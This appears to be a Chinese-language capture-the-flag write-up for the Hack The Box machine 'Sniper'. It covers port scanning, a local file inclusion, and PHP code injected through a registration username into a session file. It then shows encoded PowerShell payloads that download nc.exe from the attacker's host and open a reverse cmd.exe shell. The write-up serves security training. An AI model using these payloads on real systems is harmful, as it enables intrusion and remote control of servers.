---
layout: post
title: HTB——Sniper
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Sniper/01.png?raw=true)

# 0x01 信息收集

```bash
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                                 
[2025-04-15 23:22:12] [INFO] 暴力破解线程数: 1                                                   
[2025-04-15 23:22:12] [INFO] 开始信息扫描
[2025-04-15 23:22:12] [INFO] 最终有效主机数量: 1
[2025-04-15 23:22:12] [INFO] 开始主机扫描
[2025-04-15 23:22:12] [INFO] 有效端口数量: 233
[2025-04-15 23:22:12] [SUCCESS] 端口开放 10.129.113.99:135
[2025-04-15 23:22:12] [SUCCESS] 端口开放 10.129.113.99:445
[2025-04-15 23:22:12] [SUCCESS] 端口开放 10.129.113.99:139
[2025-04-15 23:22:12] [SUCCESS] 端口开放 10.129.113.99:80
[2025-04-15 23:22:17] [SUCCESS] 服务识别 10.129.113.99:445 => 
[2025-04-15 23:22:17] [SUCCESS] 服务识别 10.129.113.99:139 =>  Banner:[.]
[2025-04-15 23:22:17] [SUCCESS] 服务识别 10.129.113.99:80 => [http]
[2025-04-15 23:23:17] [SUCCESS] 服务识别 10.129.113.99:135 => 
[2025-04-15 23:23:17] [INFO] 存活端口数量: 4
[2025-04-15 23:23:17] [INFO] 开始漏洞扫描
[2025-04-15 23:23:17] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                         
[2025-04-15 23:23:18] [SUCCESS] 网站标题 http://10.129.113.99      状态码:200 长度:2635   标题:Sniper Co.                                                                                         
[2025-04-15 23:23:18] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.113.99                                                                          
主机名: Sniper                                                                                   
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.113.99                                                                           
   IPv6地址:                                                                                     
      └─ dead:beef::c1c4:25ae:36b8:77c7                                                          
      └─ dead:beef::169

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[23:22:14] [INFO] Start IpScan:10.129.113.99
[23:22:14] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[23:22:14] [+] 10.129.113.99:80 open
[23:22:14] [+] 10.129.113.99:139 open
[23:22:14] [+] 10.129.113.99:135 open
[23:22:14] [+] 10.129.113.99:445 open
[23:22:15] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.113.99:139 [.]
[23:22:15] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.113.99:135 [.@]
[23:22:15] [INFO] start WMI check 10.129.113.99:135
[23:22:15] [+] 开始 WmiExec 任务: WMI://10.129.113.99:135
[23:22:15] [+] [TCP/HTTP] [200] [jQuery][Microsoft-IIS/10.0][PHP] http://10.129.113.99:80 [Sniper Co.]                                                                                            
[23:22:19] [+] [TCP/MICROSOFT-DS]   10.129.113.99:445 
[23:22:19] [INFO] start SMB check 10.129.113.99:445
[23:22:19] [+] 开始 SmbScan 任务: SMB://10.129.113.99:445
```

---

# 0x02 LFI搭配session实现RCE

访问web服务，经测试我们发现在`service`服务的语言选择中有`lang`参数，可造成本地文件包含LFI。结合我们的session id ,尝试来包含服务器端的session。考虑在`register`页面的`username`字段塞入php代码来RCE，测试后发现`<echo ``>`类语句可以正常通过WAF触发。

```cmd
username|s:21:"a Volume in drive C has no label.
 Volume Serial Number is AE98-73A8

 Directory of C:\inetpub\wwwroot\blog

04/11/2019  05:23 AM    <DIR>          .
04/11/2019  05:23 AM    <DIR>          ..
04/11/2019  05:28 AM             4,341 blog-en.php
04/11/2019  05:28 AM             4,487 blog-es.php
04/11/2019  05:28 AM             4,489 blog-fr.php
04/11/2019  05:23 AM    <DIR>          css
04/11/2019  05:25 AM             1,357 error.html
04/11/2019  05:25 AM             1,331 header.html
04/11/2019  08:31 PM               442 index.php
04/11/2019  05:23 AM    <DIR>          js
               6 File(s)         16,447 bytes
               4 Dir(s)   2,404,503,552 bytes free

Directory of C:\inetpub\wwwroot\user

10/01/2019  08:44 AM    <DIR>          .
10/01/2019  08:44 AM    <DIR>          ..
04/11/2019  05:15 PM               108 auth.php
04/11/2019  05:52 AM    <DIR>          css
04/11/2019  10:51 AM               337 db.php
04/11/2019  05:23 AM    <DIR>          fonts
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  06:18 AM             4,639 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  06:10 AM             6,463 login.php
04/08/2019  11:04 PM               148 logout.php
10/01/2019  08:42 AM             7,192 registration.php
08/14/2019  10:35 PM             7,004 registration_old123123123847.php
04/11/2019  05:23 AM    <DIR>          vendor
               7 File(s)         25,891 bytes
               7 Dir(s)   2,404,491,264 bytes free
```

尝试使用`type`读取文件，发现`.`与`?`都被ban掉了，我们尝试调用`powershell`加上*来读取文件。

```php
a<?php echo `powershell type \\inetpub\\wwwroot\\user\\registration*php` ?>b
```

读取到注册页面的php文件，内容如下：

```bash
<?php
require('db.php');
// If form submitted, insert values into the database.
if (isset($_REQUEST['username'])){
        // removes backslashes
	$username = stripslashes($_REQUEST['username']);
	$username = str_replace('-', '', $username);
	$username = str_replace('$', '', $username);
	$username = str_replace('[', '', $username);
	$username = str_replace('(', '', $username);
	$username = str_replace('_', '', $username);
	$username = str_replace('.', '', $username);
	$username = str_replace(';', '', $username);
	$username = str_replace('&', '', $username);
	$username = str_replace('"', '', $username);
        //escapes special characters in a string
	$username = mysqli_real_escape_string($con,$username); 
	$email = stripslashes($_REQUEST['email']);
	$email = mysqli_real_escape_string($con,$email);
	$password = stripslashes($_REQUEST['password']);
	$password = mysqli_real_escape_string($con,$password);
	$trn_date = date("Y-m-d H:i:s");
        $query = "INSERT into `users` (username, password, email, trn_date)
VALUES ('$username', '".md5($password)."', '$email', '$trn_date')";
        $result = mysqli_query($con,$query);
        if($result){

sleep(1);
header("Location: login.php");
   }     
    }else{
?>
```

至于获取`shell`部分，我们参考WP的其中一个解法：使用session传入命令语句，调用攻击机上搭建的python HTTP服务内的`nc.exe`来反弹shell。首先，我们需要将命令从标准ascii转为符合windows命令间距的`usf-16le`，再base64一下。

```bash
┌──(root㉿kali)-[/home/kali]
└─#echo "wget http://10.10.16.7:8089/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t utf-16le | base64
dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4ANwA6ADgAMAA4ADkALwBuAGMALgBlAHgAZQAgAC0AbwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAEUATQBQAAoAYwAuAGUAeABlAAoA
```

完整命令为`powershell /enc ......`类格式。同时我们使用`rlwrap`在本地开启监听。

```php
a<?php echo `powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4ANwA6ADgAMAA4ADkALwBuAGMALgBlAHgAZQAgAC0AbwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAEUATQBQAAoAYwAuAGUAeABlAAoA`?>b
```

然后我们调用上传的nc.exe,进行反弹shell

```bash
┌──(root㉿kali)-[/home/kali/HTB/sniper]
└─# echo "C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.16.7 18441" | iconv -t utf-16le | base64 
QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA2AC4ANwAgADEAOAA0ADQAMQAKAA==

a<?php echo `powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA2AC4ANwAgADEAOAA0ADQAMQAKAA==`?>b
```